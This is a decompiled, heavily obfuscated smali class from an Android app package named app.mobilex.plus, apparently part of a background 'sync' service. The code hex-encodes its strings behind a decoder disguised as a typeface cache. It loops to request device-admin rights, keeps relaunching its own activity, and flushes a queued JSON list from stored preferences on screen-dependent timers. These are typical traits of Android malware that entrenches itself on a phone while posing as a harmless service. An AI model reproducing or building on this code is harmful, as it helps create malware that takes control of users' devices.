.class public final Lv/s/X5Jjihf3X5UVoB0;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

.field public final synthetic w9sT1Swbhx3hs:I


# direct methods
.method public synthetic constructor <init>(Lapp/mobilex/plus/services/SyncQYAdapter;I)V
    .locals 0

    .line 1
    iput p2, p0, Lv/s/X5Jjihf3X5UVoB0;->w9sT1Swbhx3hs:I

    .line 2
    .line 3
    iput-object p1, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 4
    .line 5
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 6
    .line 7
    .line 8
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 10

    .line 1
    iget v0, p0, Lv/s/X5Jjihf3X5UVoB0;->w9sT1Swbhx3hs:I

    .line 2
    .line 3
    const/4 v1, 0x0

    .line 4
    const-wide/16 v2, 0x1388

    .line 5
    .line 6
    const/16 v4, 0x5

    .line 7
    const/4 v5, 0x1

    .line 8
    const/16 v6, 0x0

    nop

    .line 9
    const-wide/16 v7, 0x7d0

    .line 10
    .line 11
    const/16 v9, 0x3

    nop

    nop

    .line 12
    packed-switch v0, :pswitch_data_0

    .line 13
    .line 14
    .line 15
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 16
    .line 17
    iget-boolean v0, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->b1EoSIRjJHO5:Z

    .line 18
    .line 19
    if-eqz v0, :cond_0

    .line 20
    .line 21
    :try_start_0
    new-instance v0, Landroid/content/ComponentName;

    nop

    nop

    .line 22
    .line 23
    iget-object v1, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 24
    .line 25
    const-class v2, Lapp/mobilex/plus/receivers/DeviceAdminReceiver;

    .line 26
    .line 27
    invoke-direct {v0, v1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 28
    .line 29
    .line 30
    iget-object v1, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 31
    .line 32
    invoke-static {v1, v0}, Lv/s/gA5gCwTK0qjTIn;->gIIiyi2ddlMDR0(Landroid/content/Context;Landroid/content/ComponentName;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 33
    .line 34
    .line 35
    :catch_0
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 36
    .line 37
    iget-object v0, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->dDIMxZXP1V8HdM:Landroid/os/Handler;

    .line 38
    .line 39
    invoke-virtual {v0, p0, v7, v8}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 40
    .line 41
    .line 42
    :cond_0
    return-void

    .line 43
    :pswitch_0
    :try_start_1
    sget-object v0, Lapp/mobilex/plus/UtilGLWorker;->gIIiyi2ddlMDR0:Ljava/lang/String;

    .line 44
    .line 45
    sget-boolean v0, Lapp/mobilex/plus/UtilGLWorker;->MLSIo1htfMPWeB8V876L:Z

    .line 46
    .line 47
    if-eqz v0, :cond_2

    .line 48
    .line 49
    sget-boolean v0, Lapp/mobilex/plus/UtilGLWorker;->XiR1pIn5878vVWd:Z

    .line 50
    .line 51
    if-nez v0, :cond_1

    .line 52
    .line 53
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 54
    .line 55
    iget v1, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->l1V0lQr6TbwNKqHfXNbb:I

    .line 56
    .line 57
    add-int/2addr v1, v5

    .line 58
    iput v1, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->l1V0lQr6TbwNKqHfXNbb:I

    .line 59
    .line 60
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 61
    .line 62
    iget v0, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->l1V0lQr6TbwNKqHfXNbb:I

    nop
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    .line 63
    .line 64
    if-gt v0, v4, :cond_3

    .line 65
    .line 66
    :try_start_2
    new-instance v0, Landroid/content/Intent;

    .line 67
    .line 68
    iget-object v1, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 69
    .line 70
    const-class v4, Lapp/mobilex/plus/UtilGLWorker;

    .line 71
    .line 72
    invoke-direct {v0, v1, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 73
    .line 74
    .line 75
    sget-object v1, Lapp/mobilex/plus/UtilGLWorker;->wotphlvK9sPbXJ:Ljava/lang/String;

    .line 76
    .line 77
    invoke-virtual {v0, v1, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 78
    .line 79
    .line 80
    const/high16 v1, 0x30010000

    .line 81
    .line 82
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 83
    .line 84
    .line 85
    iget-object v1, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 86
    .line 87
    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 88
    .line 89
    .line 90
    goto :goto_1

    .line 91
    :catch_1
    move-exception v0

    .line 92
    :try_start_3
    sget-object v1, Lapp/mobilex/plus/services/SyncQYAdapter;->ECwLkmPW1UKz7J6E:Ljava/lang/String;

    .line 93
    .line 94
    const-string v1, "000F00790058008C00B000B200DD00A9002A00620054009500B000BD00C000AE002D0071001B008200E200AD00DD00B500790036"

    .line 95
    .line 96
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 97
    .line 98
    .line 99
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 100
    .line 101
    .line 102
    goto :goto_1

    .line 103
    :catch_2
    move-exception v0

    .line 104
    goto/16 :goto_0

    .line 105
    :cond_1
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 106
    .line 107
    iput v6, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->l1V0lQr6TbwNKqHfXNbb:I

    .line 108
    .line 109
    goto :goto_1

    .line 110
    :cond_2
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 111
    .line 112
    iput v6, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->l1V0lQr6TbwNKqHfXNbb:I
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 113
    .line 114
    goto :goto_1

    .line 115
    :goto_0
    sget-object v1, Lapp/mobilex/plus/services/SyncQYAdapter;->ECwLkmPW1UKz7J6E:Ljava/lang/String;

    .line 116
    .line 117
    const-string v1, "000F00790058008C00B000B200DD00A9002A00620054009500B000BA00C000B5002C0064000100C7"

    .line 118
    .line 119
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 120
    .line 121
    .line 122
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 123
    .line 124
    .line 125
    :cond_3
    :goto_1
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 126
    .line 127
    iget-object v0, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->dDIMxZXP1V8HdM:Landroid/os/Handler;

    .line 128
    .line 129
    invoke-virtual {v0, p0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 130
    .line 131
    .line 132
    return-void

    .line 133
    :pswitch_1
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 134
    .line 135
    iget-boolean v0, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->DVTNwpDEVsUKuznof:Z

    .line 136
    .line 137
    if-nez v0, :cond_4

    .line 138
    .line 139
    goto/16 :goto_6

    .line 140
    .line 141
    :cond_4
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 142
    .line 143
    iget-boolean v0, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->Qrz92kRPw4GcghAc:Z

    .line 144
    .line 145
    if-eqz v0, :cond_5

    nop

    nop

    .line 146
    .line 147
    sget-object v0, Lapp/mobilex/plus/services/SyncQYAdapter;->ECwLkmPW1UKz7J6E:Ljava/lang/String;

    nop

    nop

    .line 148
    .line 149
    const-string v0, "000B0073005A009500E400BD00D700A6003700360048008C00F900AF00C200A20027002C001B009700E200BA00C400AE002C0063004800C700E300AB00DB00AB002F00360052008900B000AF00C000A800240064005E009400E3"

    .line 150
    .line 151
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 152
    .line 153
    .line 154
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 155
    .line 156
    iget-object v0, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->dDIMxZXP1V8HdM:Landroid/os/Handler;

    .line 157
    .line 158
    invoke-virtual {v0, p0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 159
    .line 160
    .line 161
    goto/16 :goto_6

    .line 162
    .line 163
    :cond_5
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 164
    .line 165
    invoke-virtual {v0}, Lapp/mobilex/plus/services/SyncQYAdapter;->ibVTtJUNfrGYbW()V

    .line 166
    .line 167
    .line 168
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 169
    .line 170
    iget v2, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->nQilHWaqS401ZtR:I

    .line 171
    .line 172
    add-int/2addr v2, v5

    .line 173
    iput v2, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->nQilHWaqS401ZtR:I

    .line 174
    .line 175
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 176
    .line 177
    iput-boolean v5, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->Qrz92kRPw4GcghAc:Z

    .line 178
    .line 179
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    nop

    .line 180
    .line 181
    iget-object v2, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->w9sT1Swbhx3hs:Lv/s/f58wUe2vbJhag6PETTG;

    .line 182
    .line 183
    new-instance v3, Lv/s/JnC75xOgwtSSKHn30v;

    .line 184
    .line 185
    invoke-direct {v3, v0, v1, v9}, Lv/s/JnC75xOgwtSSKHn30v;-><init>(Ljava/lang/Object;Lv/s/b9xRoaXFR1fmOO2Q;I)V

    .line 186
    .line 187
    .line 188
    invoke-static {v2, v1, v3, v9}, Lv/s/y6jRGLEWNMir;->b1EoSIRjJHO5(Lv/s/wh3Lv6S5rs6zqjV;Lv/s/oT0hSL7wye6TP1X12yCL;Lv/s/NhN5GSKLYh6STld4;I)Lv/s/snDbSR9Gb3eZZuB;

    .line 189
    .line 190
    .line 191
    :try_start_4
    sget-object v0, Lv/s/WMx7O1yIuvMieNw;->dDIMxZXP1V8HdM:Lv/s/WMx7O1yIuvMieNw;

    .line 192
    .line 193
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 194
    .line 195
    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 196
    .line 197
    .line 198
    move-result-object v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    .line 199
    :try_start_5
    new-instance v1, Lorg/json/JSONArray;

    .line 200
    .line 201
    sget-object v2, Lv/s/WMx7O1yIuvMieNw;->w9sT1Swbhx3hs:Ljava/lang/String;

    .line 202
    .line 203
    invoke-virtual {v0, v2, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 204
    .line 205
    .line 206
    move-result-object v0

    .line 207
    sget-object v2, Lv/s/WMx7O1yIuvMieNw;->vekpFI4d1Nc4fakF:Ljava/lang/String;

    .line 208
    .line 209
    const-string v3, "[]"

    .line 210
    .line 211
    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 212
    .line 213
    .line 214
    move-result-object v0

    .line 215
    invoke-direct {v1, v0}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 216
    .line 217
    .line 218
    goto :goto_2

    .line 219
    :catch_3
    :try_start_6
    new-instance v1, Lorg/json/JSONArray;

    .line 220
    .line 221
    invoke-direct {v1}, Lorg/json/JSONArray;-><init>()V

    .line 222
    .line 223
    .line 224
    :goto_2
    invoke-virtual {v1}, Lorg/json/JSONArray;->length()I

    .line 225
    .line 226
    .line 227
    move-result v0

    .line 228
    if-lez v0, :cond_6

    .line 229
    .line 230
    sget-object v0, Lapp/mobilex/plus/services/SyncQYAdapter;->ECwLkmPW1UKz7J6E:Ljava/lang/String;

    .line 231
    .line 232
    const-string v0, "000B0073005A009500E400BD00D700A60037002C001B008100FC00AA00C100AF002A0078005C00C700C3009200E100E700320063005E009200F500FF009A"

    .line 233
    .line 234
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 235
    .line 236
    .line 237
    const-string v0, "00630066005E008900F400B600DC00A0006A"

    .line 238
    .line 239
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 240
    .line 241
    .line 242
    sget-object v0, Lv/s/WMx7O1yIuvMieNw;->dDIMxZXP1V8HdM:Lv/s/WMx7O1yIuvMieNw;

    .line 243
    .line 244
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 245
    .line 246
    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 247
    .line 248
    .line 249
    move-result-object v0

    nop

    .line 250
    invoke-static {v0}, Lv/s/WMx7O1yIuvMieNw;->JXn4Qf7zpnLjP5(Landroid/content/Context;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    .line 251
    .line 252
    .line 253
    goto :goto_3

    .line 254
    :catch_4
    move-exception v0

    .line 255
    sget-object v1, Lapp/mobilex/plus/services/SyncQYAdapter;->ECwLkmPW1UKz7J6E:Ljava/lang/String;

    .line 256
    .line 257
    const-string v1, "000B0073005A009500E400BD00D700A600370036006800AA00C300FF00D400AB00360065005300C700F500AD00C000A80031002C001B"

    .line 258
    .line 259
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 260
    .line 261
    .line 262
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 263
    .line 264
    .line 265
    :cond_6
    :goto_3
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 266
    .line 267
    const-string v1, "power"

    nop

    nop

    .line 268
    .line 269
    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 270
    .line 271
    .line 272
    move-result-object v0

    .line 273
    check-cast v0, Landroid/os/PowerManager;

    nop

    nop

    .line 274
    .line 275
    invoke-virtual {v0}, Landroid/os/PowerManager;->isInteractive()Z

    .line 276
    .line 277
    .line 278
    move-result v0

    .line 279
    iget-object v1, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 280
    .line 281
    iget v1, v1, Lapp/mobilex/plus/services/SyncQYAdapter;->nQilHWaqS401ZtR:I

    .line 282
    .line 283
    if-gt v1, v4, :cond_7

    nop

    .line 284
    .line 285
    const-wide/16 v0, 0x2710

    .line 286
    .line 287
    goto :goto_4

    .line 288
    :cond_7
    if-eqz v0, :cond_8

    .line 289
    .line 290
    const-wide/32 v0, 0xafc8

    .line 291
    .line 292
    .line 293
    goto/16 :goto_4

    .line 294
    :cond_8
    const-wide/32 v0, 0xea60

    .line 295
    .line 296
    .line 297
    :goto_4
    iget-object v2, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 298
    .line 299
    iget v2, v2, Lapp/mobilex/plus/services/SyncQYAdapter;->nQilHWaqS401ZtR:I

    .line 300
    .line 301
    if-gt v2, v4, :cond_9

    nop

    .line 302
    .line 303
    sget-object v2, Lv/s/lMJPWn8FzeWU82pNUhWl;->w9sT1Swbhx3hs:Lv/s/l1V0lQr6TbwNKqHfXNbb;

    .line 304
    .line 305
    invoke-virtual {v2, v7, v8}, Lv/s/lMJPWn8FzeWU82pNUhWl;->Ee8d2j4S9Vm5yGuR(J)J

    .line 306
    .line 307
    .line 308
    move-result-wide v2

    .line 309
    goto :goto_5

    .line 310
    :cond_9
    const-wide/16 v2, 0x1f40

    .line 311
    .line 312
    sget-object v4, Lv/s/lMJPWn8FzeWU82pNUhWl;->w9sT1Swbhx3hs:Lv/s/l1V0lQr6TbwNKqHfXNbb;

    nop

    .line 313
    .line 314
    invoke-virtual {v4, v2, v3}, Lv/s/lMJPWn8FzeWU82pNUhWl;->Ee8d2j4S9Vm5yGuR(J)J

    .line 315
    .line 316
    .line 317
    move-result-wide v2

    .line 318
    :goto_5
    iget-object v4, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 319
    .line 320
    iget-wide v4, v4, Lapp/mobilex/plus/services/SyncQYAdapter;->gmNWMfvn6zlEj:J

    .line 321
    .line 322
    add-long/2addr v0, v4

    .line 323
    add-long/2addr v0, v2

    .line 324
    iget-object v2, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 325
    .line 326
    iget-object v2, v2, Lapp/mobilex/plus/services/SyncQYAdapter;->dDIMxZXP1V8HdM:Landroid/os/Handler;

    nop

    nop

    .line 327
    .line 328
    invoke-virtual {v2, p0, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 329
    .line 330
    .line 331
    :goto_6
    return-void

    .line 332
    :pswitch_2
    iget-object v0, p0, Lv/s/X5Jjihf3X5UVoB0;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 333
    .line 334
    iget-object v2, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->w9sT1Swbhx3hs:Lv/s/f58wUe2vbJhag6PETTG;

    .line 335
    .line 336
    new-instance v3, Lv/s/JnC75xOgwtSSKHn30v;

    .line 337
    .line 338
    const/16 v4, 0x2

    .line 339
    invoke-direct {v3, v0, v1, v4}, Lv/s/JnC75xOgwtSSKHn30v;-><init>(Ljava/lang/Object;Lv/s/b9xRoaXFR1fmOO2Q;I)V

    .line 340
    .line 341
    .line 342
    invoke-static {v2, v1, v3, v9}, Lv/s/y6jRGLEWNMir;->b1EoSIRjJHO5(Lv/s/wh3Lv6S5rs6zqjV;Lv/s/oT0hSL7wye6TP1X12yCL;Lv/s/NhN5GSKLYh6STld4;I)Lv/s/snDbSR9Gb3eZZuB;

    .line 343
    .line 344
    .line 345
    iget-object v0, v0, Lapp/mobilex/plus/services/SyncQYAdapter;->dDIMxZXP1V8HdM:Landroid/os/Handler;

    .line 346
    .line 347
    const-wide/16 v1, 0x7530

    .line 348
    .line 349
    invoke-virtual {v0, p0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 350
    .line 351
    .line 352
    return-void

    nop

    .line 353
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
